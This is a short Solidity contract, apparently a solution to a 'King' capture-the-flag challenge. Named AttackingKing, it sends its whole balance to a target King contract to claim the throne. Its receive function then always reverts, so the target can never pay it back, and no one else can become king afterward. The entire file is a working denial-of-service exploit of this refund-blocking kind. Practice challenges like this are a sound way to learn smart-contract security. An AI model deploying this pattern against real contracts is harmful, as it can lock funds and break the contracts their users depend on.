// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        payable(contractAddress).call{value: address(this).balance}("");
    }

    receive() external payable {
        revert("Not going to let you be the king!");
    }
}
